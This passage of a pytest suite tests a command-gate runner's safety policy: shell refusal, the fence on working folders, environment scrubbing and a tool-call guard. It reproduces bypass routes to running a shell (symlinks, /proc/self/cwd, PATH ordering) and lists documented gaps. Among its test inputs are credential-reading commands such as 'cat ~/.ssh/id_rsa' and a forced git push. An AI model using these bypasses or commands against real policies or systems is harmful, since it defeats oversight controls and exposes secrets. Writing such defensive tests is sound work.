NOT_SHELLS = [
    ("pytest", "-k", "bash"),  # a plain program: only argv[0] and wrapper arguments are looked at
    ("python", "-c", "print(1)"),
    ("env", "A=1", "pytest"),
    ("env", "python", "-V"),
    ("xargs", "-n1", "echo"),
    ("find", ".", "-name", "x"),
    ("timeout", "5", "pytest"),
    ("nice", "-n", "5", "ruff"),
    ("shellcheck", "x.sh"),
    ("bash-completion",),
    ("fishfood",),
    ("sh.py",),
    ("ssh-keygen",),
    ("busybox", "ls"),
]


@pytest.mark.parametrize("argv", NOT_SHELLS, ids=lambda v: " ".join(v)[:40])
def test_ordinary_programs_are_not_mistaken_for_shells(
    tmp_path: Path, argv: tuple[str, ...]
) -> None:
    got = plan(tmp_path, argv=argv)
    assert isinstance(got, Plan) and got.argv == argv


# --- the child starts in the GATE's folder: so does the resolution (ATK4, round 2) ---------------


def _shell_link(folder: Path, name: str = "mysh") -> Path:
    target = shutil.which("sh")
    assert target is not None
    folder.mkdir(parents=True, exist_ok=True)
    (folder / name).symlink_to(target)
    return folder / name


def test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, spy: Spy
) -> None:
    """The judge's repro 1: runner in the parent folder, gate cwd 'sub', ./mysh -> a shell."""
    spy.block = True
    sub = tmp_path / "sub"
    _shell_link(sub)
    monkeypatch.chdir(tmp_path)
    gate = G(argv=("./mysh", "-c", "echo A; echo B > out.txt"), cwd="sub")
    got = plan_gate(gate, Workspace(tmp_path), False)
    assert isinstance(got, str) and "--allow-shell" in got
    report = run(tmp_path, [gate])
    assert (
        statuses(report) == ["policy-error"] and spy.calls == [] and not (sub / "out.txt").exists()
    )


def test_a_relative_symlink_is_refused_when_the_runner_is_in_another_folder(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, spy: Spy
) -> None:
    """The judge's repro 2: runner in other/, root = sub, default cwd, ./mysh -> a shell."""
    spy.block = True
    sub, other = tmp_path / "sub", tmp_path / "other"
    _shell_link(sub)
    other.mkdir()
    monkeypatch.chdir(other)
    gate = G(argv=("./mysh", "-c", "echo B > out2.txt"))
    got = plan_gate(gate, Workspace(sub), False)
    assert isinstance(got, str) and "--allow-shell" in got
    report = run_gates([gate], Workspace(sub))
    assert (
        statuses(report) == ["policy-error"] and spy.calls == [] and not (sub / "out2.txt").exists()
    )


@pytest.mark.parametrize("variant", ["cwd-sub", "root-sub"])
def test_the_real_cli_refuses_a_relative_link_to_a_shell_and_creates_nothing(
    tmp_path: Path, variant: str
) -> None:
    sub, other = tmp_path / "sub", tmp_path / "other"
    _shell_link(sub)
    other.mkdir()
    if variant == "cwd-sub":
        gf = write(
            tmp_path, doc({"id": "a", "argv": ["./mysh", "-c", "echo B > out.txt"], "cwd": "sub"})
        )
        proc = cli(str(gf), cwd=tmp_path)
    else:
        gf = write(tmp_path, doc({"id": "a", "argv": ["./mysh", "-c", "echo B > out.txt"]}))
        proc = cli(str(gf), "--root", str(sub), cwd=other)
    assert proc.returncode == 2 and json.loads(proc.stdout)["gates"][0]["status"] == "policy-error"
    assert not (sub / "out.txt").exists() and not (other / "out.txt").exists()


@pytest.mark.parametrize("path_value", ["bin", ".", "", "/nonexistent::/nonexistent", "bin:."])
def test_a_bare_name_is_searched_along_a_relative_or_empty_path_entry_from_the_gate_cwd(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, path_value: str
) -> None:
    """The child's exec treats an empty or relative PATH entry as its own cwd (the gate cwd)."""
    gate_dir, other = tmp_path / "gate", tmp_path / "other"
    _shell_link(gate_dir / "bin", "mytool")
    _shell_link(gate_dir, "mytool")
    other.mkdir()
    monkeypatch.chdir(other)
    monkeypatch.setenv("PATH", path_value)
    got = plan_gate(G(argv=("mytool", "-c", "a"), cwd="."), Workspace(gate_dir), False)
    assert isinstance(got, str) and "--allow-shell" in got


def test_the_relative_path_entry_is_not_taken_from_the_runner_cwd(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A link to a shell in the RUNNER's folder must not make an unrelated gate folder refused."""
    runner_dir, gate_dir = tmp_path / "runner", tmp_path / "gate"
    _shell_link(runner_dir, "mytool")
    gate_dir.mkdir()
    (gate_dir / "mytool").write_text("#!/bin/sh\nexit 0\n")
    (gate_dir / "mytool").chmod(0o755)
    monkeypatch.chdir(runner_dir)
    monkeypatch.setenv("PATH", ".")
    got = plan_gate(G(argv=("mytool",), cwd="."), Workspace(gate_dir), False)
    assert isinstance(got, Plan)


def test_a_non_executable_file_on_path_is_skipped_like_the_child_does(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    first, second = tmp_path / "first", tmp_path / "second"
    first.mkdir()
    (first / "mytool").symlink_to(shutil.which("sh") or "/bin/sh")
    (first / "mytool").unlink()
    (first / "mytool").write_text("data")  # not executable: exec skips it
    _shell_link(second, "mytool")
    monkeypatch.setenv("PATH", f"{first}:{second}")
    got = plan(tmp_path, argv=("mytool", "-c", "a"))
    assert isinstance(got, str) and "--allow-shell" in got


def test_a_directory_of_the_same_name_on_path_is_skipped_like_the_child_does(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    first, second = tmp_path / "first", tmp_path / "second"
    (first / "mytool").mkdir(parents=True)  # exec cannot run a directory: it moves on
    _shell_link(second, "mytool")
    monkeypatch.setenv("PATH", f"{first}:{second}")
    got = plan(tmp_path, argv=("mytool", "-c", "a"))
    assert isinstance(got, str) and "--allow-shell" in got


def test_the_stated_residual_limits_of_the_shell_refusal_are_pinned(tmp_path: Path) -> None:
    """Not detected, on purpose (Does not cover): a copy or hard link of a shell, a symlink to a
    wrapper, and a link made by an EARLIER gate (every gate is validated before any runs)."""
    shell = shutil.which("sh")
    assert shell is not None
    shutil.copy(os.path.realpath(shell), tmp_path / "copied")
    os.link(
        tmp_path / "copied", tmp_path / "hard"
    )  # a hard link of our own copy: protected_hardlinks forbids linking /usr/bin/dash
    (tmp_path / "toolwrapper").symlink_to(shutil.which("env") or "/usr/bin/env")
    for argv in [("./copied", "-c", "a"), ("./hard", "-c", "a"), ("./toolwrapper", "sh")]:
        assert isinstance(plan(tmp_path, argv=argv), Plan), argv
    first = G("one", argv=("ln", "-s", shell, "later"))
    second = G("two", argv=("./later", "-c", "echo B > out.txt"))
    assert isinstance(plan_gate(first, Workspace(tmp_path), False), Plan)
    assert isinstance(
        plan_gate(second, Workspace(tmp_path), False), Plan
    )  # the link does not exist yet


@pytest.mark.parametrize(
    "argv",
    [
        ("timeout", "5", "pytest", "tests/shell/sh"),
        ("find", ".", "-path", "*/bash"),
        ("time", "pytest", "-k", "sh"),
    ],
    ids=lambda v: " ".join(v)[:40],
)
def test_the_documented_wrapper_false_positives_are_refused(
    tmp_path: Path, argv: tuple[str, ...]
) -> None:
    got = plan(tmp_path, argv=argv)
    assert isinstance(got, str) and "wrapper" in got


# --- /proc and /dev are refused outright (ATK5, round 3), and the PATH search takes the FIRST hit (ATK6) ---


def _fake_shell(folder: Path, name: str = "bash") -> Path:
    """An executable file called like a shell that, if it ever ran, writes out.txt in its cwd.
    Host independent (a link to the host's own `sh` is a busybox applet on Alpine)."""
    folder.mkdir(parents=True, exist_ok=True)
    path = folder / name
    path.write_text('#!/bin/sh\necho RAN > "$PWD/out.txt"\n')
    path.chmod(0o755)
    return path


def _proc_words(gate_dir: Path) -> list[str]:
    deep = "../" * 40
    return [
        "/proc/self/cwd/mysh",
        "/proc/thread-self/cwd/mysh",
        "/proc/self/cwd/./mysh",
        f"/proc/{os.getpid()}/cwd/mysh",
        "/proc/self/root/bin/sh",
        "/proc/self/fd/3",
        "/dev/fd/3",
        "/dev/stdin",
        "/dev/null",
        "/dev/shm/tool",
        "//proc/self/cwd/mysh",
        "/./proc/self/cwd/mysh",
        "/proc/../proc/self/cwd/mysh",
        "/proc",
        "/dev",
        f"{deep}proc/self/cwd/mysh",
        f"{deep}dev/null",
    ]


@pytest.mark.parametrize("index", range(17))
def test_a_path_under_proc_or_dev_is_refused_with_the_runner_in_another_folder(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, spy: Spy, index: int
) -> None:
    """The judge's ATK5: /proc/self/cwd is the RUNNER's folder when the runner resolves it and the
    CHILD's folder when the child opens it, so any word under /proc or /dev is refused unresolved.
    """
    spy.block = True
    sub = tmp_path / "sub"
    shell = _fake_shell(tmp_path / "bin")
    sub.mkdir()
    (sub / "mysh").symlink_to(shell)
    monkeypatch.chdir(tmp_path)
    word = _proc_words(sub)[index]
    gate = G(argv=(word, "-c", "echo B > out.txt"), cwd="sub")
    got = plan_gate(gate, Workspace(tmp_path), False)
    why = "'..'" if ".." in word.split("/") else "/proc or /dev"
    assert isinstance(got, str) and why in got and "needle" not in got
    report = run(tmp_path, [gate])
    assert statuses(report) == ["policy-error"] and spy.calls == []
    assert not (sub / "out.txt").exists() and not (tmp_path / "out.txt").exists()


@pytest.mark.parametrize(
    "word", ["/proc/self/cwd/mysh", "/proc/thread-self/cwd/mysh", "/proc/self/cwd/./mysh"]
)
def test_the_real_cli_refuses_the_proc_cwd_bypass_and_creates_nothing(
    tmp_path: Path, word: str
) -> None:
    """The judge's repro: before the fix the child ran the shell (status pass, out.txt created)."""
    sub = tmp_path / "sub"
    shell = _fake_shell(tmp_path / "bin")
    sub.mkdir()
    (sub / "mysh").symlink_to(shell)
    gf = write(tmp_path, doc({"id": "a", "argv": [word, "-c", "x"], "cwd": "sub"}))
    proc = cli(str(gf), cwd=tmp_path)
    assert proc.returncode == 2 and json.loads(proc.stdout)["gates"][0]["status"] == "policy-error"
    assert not (sub / "out.txt").exists()


@pytest.mark.parametrize("entry", ["/proc/self/cwd", "/dev/fd", "/proc", "/dev/shm"])
def test_a_path_entry_under_proc_or_dev_refuses_a_bare_name(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, spy: Spy, entry: str
) -> None:
    spy.block = True
    sub = tmp_path / "sub"
    shell = _fake_shell(tmp_path / "bin")
    sub.mkdir()
    (sub / "mytool").symlink_to(shell)
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("PATH", f"{entry}:/usr/bin:/bin")
    got = plan_gate(G(argv=("mytool", "-c", "a"), cwd="sub"), Workspace(tmp_path), False)
    assert isinstance(got, str) and "/proc or /dev" in got


def test_a_relative_path_entry_that_is_a_link_into_proc_refuses_a_bare_name(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    (tmp_path / "pdir").symlink_to("/proc/self/cwd")
    monkeypatch.setenv("PATH", "pdir")
    got = plan(tmp_path, argv=("mytool", "-c", "a"))
    assert isinstance(got, str) and "/proc or /dev" in got


@pytest.mark.parametrize(
    "kind", ["file-link", "dir-link", "chain", "dev-link", "dotdot-link", "root-link"]
)
def test_a_symlink_in_the_gate_folder_that_leads_into_proc_or_dev_is_refused(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, kind: str
) -> None:
    sub = tmp_path / "sub"
    sub.mkdir()
    _fake_shell(sub, "mysh")
    if kind == "file-link":
        (sub / "lnk").symlink_to("/proc/self/cwd/mysh")
        word = "./lnk"
    elif kind == "dir-link":
        (sub / "d").symlink_to("/proc/self/cwd")
        word = "d/mysh"
    elif kind == "chain":
        (sub / "l2").symlink_to("/proc/self/cwd/mysh")
        (sub / "l1").symlink_to("l2")
        word = "./l1"
    elif kind == "root-link":  # d -> /, so d/proc/self/cwd/mysh IS /proc/self/cwd/mysh
        (sub / "d").symlink_to("/")
        word = "d/proc/self/cwd/mysh"
    elif kind == "dotdot-link":  # d -> /dev, so d/../dev/null IS /dev/null (".." after the link)
        (sub / "d").symlink_to("/dev")
        word = "d/../dev/null"
    else:
        (sub / "lnk").symlink_to("/dev/null")
        word = "./lnk"
    monkeypatch.chdir(tmp_path)
    got = plan_gate(G(argv=(word, "-c", "a"), cwd="sub"), Workspace(tmp_path), False)
    why = "'..'" if kind == "dotdot-link" else "/proc or /dev"
    assert isinstance(got, str) and why in got


def test_a_path_hit_that_is_a_link_into_proc_is_refused(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The hit is found through the RUNNER's /proc/self/cwd (an executable `mysh` in the runner's
    folder), a harmless name; the child would open its own cwd instead."""
    run_dir, sub = tmp_path / "run", tmp_path / "sub"
    harmless = run_dir / "mysh"
    run_dir.mkdir()
    harmless.write_text("#!/bin/sh\nexit 0\n")
    harmless.chmod(0o755)
    sub.mkdir()
    (sub / "mytool").symlink_to("/proc/self/cwd/mysh")
    monkeypatch.chdir(run_dir)
    monkeypatch.setenv("PATH", str(sub))
    got = plan_gate(G(argv=("mytool", "-c", "a"), cwd="sub"), Workspace(tmp_path), False)
    assert isinstance(got, str) and "/proc or /dev" in got


def test_the_proc_refusal_never_echoes_the_word(tmp_path: Path) -> None:
    got = plan(tmp_path, argv=("/dev/needle-77/bin", "-c", "x"))
    assert isinstance(got, str) and "/proc or /dev" in got and "needle" not in got


def test_a_link_loop_is_refused_not_followed_forever(tmp_path: Path) -> None:
    (tmp_path / "a").symlink_to("b")
    (tmp_path / "b").symlink_to("a")
    got = plan(tmp_path, argv=("./a",))
    assert isinstance(got, str) and "link loop" in got


def test_only_the_executable_word_is_looked_at_for_proc_and_dev(tmp_path: Path) -> None:
    """The cost of the rule: an executable under /proc or /dev (also /dev/shm) is refused; arguments,
    `python -c` bodies and wrapper arguments are not touched, nor is a declared shell gate."""
    for argv in [
        ("python", "-c", "open('/dev/null')"),
        ("python", "/proc/self/status"),
        ("cat", "/dev/null"),
        ("env", "python", "-V", "/dev/null"),
    ]:
        assert isinstance(plan(tmp_path, argv=argv), Plan), argv
    got = plan(tmp_path, command="cat /proc/self/status > /dev/null", shell=True, allow_shell=True)
    assert isinstance(got, Plan)


def test_the_first_path_hit_wins_not_the_last(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """ATK6 / the judge's K08: d1/mytool is a link to a shell, d2/mytool a harmless executable. The
    child runs d1's, so the plan must refuse. Independent of root or not, and of busybox."""
    shell = _fake_shell(tmp_path / "real")
    (tmp_path / "d1").mkdir()
    (tmp_path / "d1" / "mytool").symlink_to(shell)
    harmless = tmp_path / "d2" / "mytool"
    harmless.parent.mkdir()
    harmless.write_text("#!/bin/sh\nexit 0\n")
    harmless.chmod(0o755)
    monkeypatch.setenv("PATH", f"{tmp_path / 'd1'}:{tmp_path / 'd2'}")
    got = plan(tmp_path, argv=("mytool", "-c", "a"))
    assert isinstance(got, str) and "--allow-shell" in got
    monkeypatch.setenv("PATH", f"{tmp_path / 'd2'}:{tmp_path / 'd1'}")  # harmless first: accepted
    assert isinstance(plan(tmp_path, argv=("mytool", "-c", "a")), Plan)


@pytest.mark.parametrize("earlier", ["no-shebang", "missing-interpreter"])
def test_the_stated_limit_an_earlier_path_file_that_exec_skips_is_accepted(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, earlier: str
) -> None:
    """Documented limit (module docstring, Does not cover): an executable earlier on PATH that exec
    skips for another reason (ENOEXEC without a shebang, ENOENT for a missing interpreter), then a
    shell link of the same name: the plan accepts it, the child runs the shell."""
    first = tmp_path / "first"
    first.mkdir()
    bad = first / "mytool"
    bad.write_text("plain data\n" if earlier == "no-shebang" else "#!/nonexistent/interpreter\n")
    bad.chmod(0o755)
    shell = _fake_shell(tmp_path / "real")
    (tmp_path / "second").mkdir()
    (tmp_path / "second" / "mytool").symlink_to(shell)
    monkeypatch.setenv("PATH", f"{first}:{tmp_path / 'second'}")
    assert isinstance(plan(tmp_path, argv=("mytool", "-c", "a")), Plan)


def test_a_declared_shell_gate_still_runs_through_sh_when_allowed(tmp_path: Path) -> None:
    got = plan(tmp_path, command="bash -c 'a; b'", shell=True, allow_shell=True)
    assert isinstance(got, Plan) and got.argv == ("/bin/sh", "-c", "bash -c 'a; b'")
    report = run(tmp_path, [G(command="echo A; echo B > out.txt", shell=True)], allow_shell=True)
    assert statuses(report) == ["pass"] and (tmp_path / "out.txt").read_text() == "B\n"


@pytest.mark.parametrize("how", ["path", "bare"])
def test_a_symlink_that_points_at_a_shell_is_refused_whatever_it_is_called(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, how: str
) -> None:
    target = shutil.which("sh")
    assert target is not None
    (tmp_path / "gate-runner").symlink_to(target)
    monkeypatch.setenv("PATH", str(tmp_path))
    word = str(tmp_path / "gate-runner") if how == "path" else "gate-runner"
    got = plan(tmp_path, argv=(word, "-c", "a"))
    assert isinstance(got, str) and "shell" in got


def test_a_file_named_sh_is_refused_by_name_even_when_it_is_not_a_shell(tmp_path: Path) -> None:
    (tmp_path / "sh").write_text("#!/bin/sh\nexit 0\n")
    (tmp_path / "sh").chmod(0o755)
    got = plan(tmp_path, argv=(str(tmp_path / "sh"),))
    assert isinstance(got, str) and "shell" in got


def test_a_shell_gate_in_a_file_spawns_nothing_and_exits_2(tmp_path: Path) -> None:
    gf = write(tmp_path, doc({"id": "a", "argv": ["sh", "-c", "echo B > out.txt"]}))
    proc = cli(str(gf), "--root", str(tmp_path), cwd=tmp_path)
    assert proc.returncode == 2 and not (tmp_path / "out.txt").exists()
    report = json.loads(proc.stdout)
    assert (
        report["gates"][0]["status"] == "policy-error"
        and "--allow-shell" in report["gates"][0]["message"]
    )


def test_the_shell_check_never_runs_on_a_declared_shell_gate_argv(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    def boom(argv: Any, cwd: Any) -> str | None:
        raise AssertionError("called")

    monkeypatch.setattr(gm, "_shell_refusal", boom)
    got = plan(tmp_path, command="a && b", shell=True, allow_shell=True)
    assert isinstance(got, Plan)


def test_the_shell_check_covers_the_list_form_and_the_string_form_the_same_way(
    tmp_path: Path,
) -> None:
    for argv in [("sh",), ("env", "bash"), ("/bin/dash", "-c", "x")]:
        a = plan(tmp_path, argv=argv)
        b = plan(tmp_path, command=shlex.join(argv))
        assert isinstance(a, str) and a == b


ALL_SHELLS = sorted(
    {"sh", "bash", "dash", "ash", "ksh", "mksh", "pdksh", "posh", "yash", "zsh", "fish", "csh", "tcsh", "rbash"}
)  # fmt: skip
ALL_WRAPPERS = sorted(
    {"env", "xargs", "busybox", "toybox", "nohup", "exec", "command", "builtin", "sudo", "doas", "timeout",
     "nice", "ionice", "setsid", "stdbuf", "chroot", "find", "flock", "unshare", "strace", "time", "chrt",
     "taskset", "script", "runuser", "setpriv", "nsenter", "ssh", "parallel"}
)  # fmt: skip


def test_shell_names_and_wrappers_are_the_documented_lists() -> None:
    assert gm.SHELL_NAMES == set(ALL_SHELLS)
    assert gm.WRAPPERS == set(ALL_WRAPPERS)
    assert gm.SHELL_RUNNERS == {"su", "watch"}
    assert gm.HANDLED_SIGNALS == (signal.SIGTERM, signal.SIGHUP)


@pytest.mark.parametrize("name", ALL_SHELLS)
def test_every_listed_shell_is_refused_as_the_executable_and_behind_a_wrapper(
    tmp_path: Path, name: str
) -> None:
    for argv in [(name, "-c", "a"), ("env", name), (f"/opt/x/{name.upper()}.EXE", "-c", "a")]:
        got = plan(tmp_path, argv=argv)
        assert isinstance(got, str) and "--allow-shell" in got, argv


@pytest.mark.parametrize("wrapper", ALL_WRAPPERS)
def test_every_listed_wrapper_is_refused_when_handed_a_shell_and_allowed_otherwise(
    tmp_path: Path, wrapper: str
) -> None:
    refused = plan(tmp_path, argv=(wrapper, "-x", "/usr/bin/Bash"))
    assert isinstance(refused, str) and "wrapper" in refused and "--allow-shell" in refused
    ok = plan(tmp_path, argv=(wrapper, "-x", "pytest"))
    assert isinstance(ok, Plan)


@pytest.mark.parametrize("runner_name", ["su", "watch"])
def test_programs_that_run_a_shell_by_design_are_refused_outright(
    tmp_path: Path, runner_name: str
) -> None:
    got = plan(tmp_path, argv=(runner_name, "-n", "5", "pytest"))
    assert isinstance(got, str) and "--allow-shell" in got


def test_shell_gate_needs_the_caller_flag(tmp_path: Path) -> None:
    got = plan(tmp_path, command="cd x && y", shell=True)
    assert isinstance(got, str) and "--allow-shell" in got


def test_shell_gate_is_refused_without_posix(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(gm, "os", types.SimpleNamespace(name="nt"))
    got = plan(tmp_path, command="cd x && y", shell=True, allow_shell=True)
    assert got == "shell gates need a POSIX shell"


@pytest.mark.parametrize("line", ["", "   ", "\n"])
def test_shell_gate_empty_command(tmp_path: Path, line: str) -> None:
    assert plan(tmp_path, command=line, shell=True, allow_shell=True) == "empty command"


def test_shell_gate_length_boundary(tmp_path: Path) -> None:
    assert isinstance(
        plan(tmp_path, command="echo " + "a" * 4091, shell=True, allow_shell=True), Plan
    )
    got = plan(tmp_path, command="echo " + "a" * 4092, shell=True, allow_shell=True)
    assert got == "command is too long"


def test_shell_gate_nul_is_refused(tmp_path: Path) -> None:
    got = plan(tmp_path, command="echo a\x00b", shell=True, allow_shell=True)
    assert isinstance(got, str) and "NUL" in got


def test_shell_gate_keeps_metacharacters_and_newlines(tmp_path: Path) -> None:
    line = "echo a | cat\necho b"
    got = plan(tmp_path, command=line, shell=True, allow_shell=True)
    assert isinstance(got, Plan) and got.argv[2] == line


# --- the command guard and the sensitive-path denylist apply to gate argv ----------------


@pytest.mark.parametrize(
    "kw",
    [
        {"command": "git push --force"},
        {"command": "git push --force origin main"},
        {"argv": ("git", "push", "--force")},
        {"argv": ("git", "push", "--force", "origin", "main")},
        {"command": "cat ~/.ssh/id_rsa"},
        {"command": "cat " + os.path.expanduser("~/.ssh/id_rsa")},
        {"argv": ("cat", os.path.expanduser("~/.ssh/id_rsa"))},
        {"argv": ("cat", os.path.expanduser("~/.aws/credentials"))},
        {"argv": ("python", "-c", "x", os.path.expanduser("~/.netrc"))},
        {"command": "git push --force origin main", "shell": True},
        {"command": "cat ~/.ssh/id_rsa", "shell": True},
        {"command": "sh -c 'git push --force'", "shell": True},
    ],
    ids=lambda kw: json.dumps(kw)[:60],
)
def test_guard_denial_is_a_policy_error(tmp_path: Path, spy: Spy, kw: dict[str, Any]) -> None:
    spy.block = True
    report = run(tmp_path, [G(**kw)], allow_shell=True)
    assert statuses(report) == ["policy-error"]
    assert report.gates[0].message.startswith("Blocked by safety policy (rule ")
    assert spy.calls == []


@pytest.mark.parametrize(
    "kw",
    [
        {"command": "needle-77; x"},
        {"command": "needle-77 'unbalanced"},
        {"command": "needle-77 \x00"},
        {"command": "x" * 5000 + " needle-77"},
        {"argv": ("-needle-77",)},
        {"argv": ("needle=77", "x")},
        {"argv": ("echo", "needle-77\x00")},
        {"argv": ("echo", "a" * 5000, "needle-77")},
        {"argv": ("git", "push", "--force", "needle-77")},
        {"argv": ("/needle-77/bash", "-c", "x")},
        {"argv": ("env", "needle-77", "sh")},
        {"command": "needle-77/dash -c id"},
        {"argv": ("echo",), "cwd": "../needle-77"},
        {"argv": ("echo",), "cwd": "needle-77"},
    ],
    ids=lambda kw: json.dumps(kw)[:50],
)
def test_a_refusal_never_echoes_the_command_or_cwd(tmp_path: Path, kw: dict[str, Any]) -> None:
    got = plan(tmp_path, allow_shell=False, **kw)
    assert isinstance(got, str) and "needle-77" not in got
    report = run(tmp_path, [G("only", **kw)], allow_shell=True)
    assert "needle-77" not in json.dumps(gm.asdict(report))


def test_guard_allows_ordinary_gates(tmp_path: Path) -> None:
    for kw in (
        {"command": "python -m pytest -q tests"},
        {"command": "ruff check src tests"},
        {"command": "mypy --strict src"},
        {"command": "git diff --exit-code"},
        {"command": "git push origin feature"},
        {"argv": (PY, "-c", "print(1)")},
        {"command": "cd web && make check && make docs", "shell": True},
    ):
        assert isinstance(plan(tmp_path, allow_shell=True, **kw), Plan), kw


def test_guard_runs_on_the_joined_argv_and_is_called_once(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    seen: list[Any] = []

    def fake(call: Any) -> str | None:
        seen.append((call.arguments["command"], call.arguments["cwd"]))
        return "deny"

    monkeypatch.setattr(gm, "guard_tool_call", fake)
    assert plan(tmp_path, command="pytest -k 'a b'") == "deny"
    assert plan(tmp_path, argv=("echo", "a b")) == "deny"
    assert plan(tmp_path, command="a && b", shell=True, allow_shell=True) == "deny"
    here = str(tmp_path.resolve())
    assert seen == [("pytest -k 'a b'", here), ("echo 'a b'", here), ("a && b", here)]


def test_a_guard_crash_is_a_refusal_not_a_spawn(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, spy: Spy
) -> None:
    spy.block = True

    def boom(call: Any) -> str | None:
        raise RuntimeError("synthetic")

    monkeypatch.setattr(gm, "guard_tool_call", boom)
    report = run(tmp_path, [P("pass")])
    assert statuses(report) == ["policy-error"] and report.gates[0].message == "policy check failed"
    assert "synthetic" not in json.dumps(gm.asdict(report)) and spy.calls == []


@pytest.mark.parametrize("sub", [".ssh/keys", ".ssh", ".kube", ".aws", ".config/gcloud"])
def test_a_credential_folder_is_refused_as_cwd_even_inside_the_root(
    tmp_path: Path, spy: Spy, sub: str
) -> None:
    spy.block = True
    (tmp_path / sub).mkdir(parents=True)
    report = run(tmp_path, [P("pass", cwd=sub)])
    assert (
        statuses(report) == ["policy-error"] and "(rule sensitive-path)" in report.gates[0].message
    )
    assert spy.calls == []


# --- the cwd fence -----------------------------------------------------------------------


def test_cwd_default_is_the_root_and_child_runs_there(tmp_path: Path) -> None:
    report = run(tmp_path, [P("import os; print(os.getcwd())")])
    assert report.gates[0].stdout_tail == str(tmp_path.resolve()) + "\n"


def test_cwd_subfolder_is_honoured_by_the_child(tmp_path: Path) -> None:
    (tmp_path / "sub").mkdir()
    report = run(tmp_path, [P("import os; print(os.getcwd())", cwd="sub")])
    assert report.gates[0].stdout_tail == str((tmp_path / "sub").resolve()) + "\n"


def test_cwd_dot_dot_inside_the_root_is_fine(tmp_path: Path) -> None:
    (tmp_path / "sub").mkdir()
    assert isinstance(plan(tmp_path, argv=("echo",), cwd="sub/../sub"), Plan)


def test_cwd_outside_the_root_is_refused(tmp_path: Path, spy: Spy) -> None:
    spy.block = True
    root = tmp_path / "root"
    root.mkdir()
    (tmp_path / "outside").mkdir()
    (root / "link").symlink_to(tmp_path / "outside")
    for cwd in ("..", "../outside", str(tmp_path), "/", "/tmp", "link", "link/.."):
        report = run_gates([P("pass", cwd=cwd)], Workspace(root))
        assert statuses(report) == ["policy-error"], cwd
        assert report.gates[0].message.startswith("cwd refused"), cwd
    assert spy.calls == []


@pytest.mark.parametrize("cwd", ["", "   ", "a\x00b", "a|b", "CON", "C:\\x", "//host/share"])
def test_cwd_lexical_refusals(tmp_path: Path, cwd: str) -> None:
    got = plan(tmp_path, argv=("echo",), cwd=cwd)
    assert isinstance(got, str) and got.startswith("cwd refused")


def test_cwd_must_be_an_existing_folder(tmp_path: Path) -> None:
    (tmp_path / "file.txt").write_text("x")
    assert plan(tmp_path, argv=("echo",), cwd="file.txt") == "cwd is not a folder"
    assert plan(tmp_path, argv=("echo",), cwd="missing") == "cwd is not a folder"


def test_shell_gates_are_fenced_too(tmp_path: Path) -> None:
    got = plan(tmp_path, command="echo a", shell=True, allow_shell=True, cwd="..")
    assert isinstance(got, str) and got.startswith("cwd refused")


# --- the spawn ---------------------------------------------------------------------------


def test_spawn_arguments(tmp_path: Path, spy: Spy, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("GATETEST_PLAIN", "kept")
    monkeypatch.setenv("GATETEST_API_TOKEN", "dropped")
    run(tmp_path, [P("pass", timeout_s=20)])
    (args, kwargs), *rest = spy.calls
    assert not rest and args[0] == [PY, "-c", "pass"]
    assert not kwargs.get("shell", False)
    assert kwargs["cwd"] == str(tmp_path.resolve())
    assert kwargs["stdin"] == subprocess.DEVNULL
    assert kwargs["start_new_session"] is True
    assert kwargs["env"]["GATETEST_PLAIN"] == "kept" and "GATETEST_API_TOKEN" not in kwargs["env"]
    assert "PATH" in kwargs["env"]


def test_one_spawn_per_gate_in_declared_order(tmp_path: Path, spy: Spy) -> None:
    gates = [P(f"print({i})", id=f"g{i}") for i in range(5)]
    report = run(tmp_path, gates)
    assert [r.id for r in report.gates] == [f"g{i}" for i in range(5)]
    assert [r.stdout_tail for r in report.gates] == [f"{i}\n" for i in range(5)]
    assert len(spy.calls) == 5


def test_stdin_is_closed_not_inherited(tmp_path: Path) -> None:
    gf = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", "import sys; sys.exit(sys.stdin.read() != '')"],
                              "timeout_s": 10}))  # fmt: skip
    env = {**os.environ, "PYTHONPATH": str(SRC)}
    with open(tmp_path / "out.json", "w") as out:
        proc = subprocess.Popen(
            [PY, "-m", "master_finhub.evals.gates", str(gf)],
            stdin=subprocess.PIPE, stdout=out, env=env, cwd=tmp_path,
        )  # fmt: skip
        try:
            code = proc.wait(timeout=60)  # stdin stays OPEN on our side: an inherited stdin hangs
        finally:
            assert proc.stdin is not None
            proc.stdin.close()
    assert code == 0


def test_env_is_scrubbed(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    for name in (
        "GATETEST_API_KEY",
        "GATETEST_DB_PASSWORD",
        "GATETEST_SECRET",
        "GATETEST_AUTH_TOKEN",
        "gatetest_lower_token",
    ):
        monkeypatch.setenv(name, "zq-value-" + name)
    monkeypatch.setenv("GATETEST_PLAIN", "kept")
    report = run(tmp_path, [P("import os, json; print(json.dumps(sorted(os.environ)))")])
    names = json.loads(report.gates[0].stdout_tail)
    assert "GATETEST_PLAIN" in names and "PATH" in names
    assert not [n for n in names if n.upper().startswith("GATETEST_") and n != "GATETEST_PLAIN"]
    assert "gatetest_lower_token" not in names
    assert "zq-value-" not in json.dumps(gm.asdict(report))


def test_exit_code_mapping(tmp_path: Path) -> None:
    gates = [
        P("pass", id="ok"),
        P("import sys; sys.exit(1)", id="one"),
        P("import sys; sys.exit(3)", id="three"),
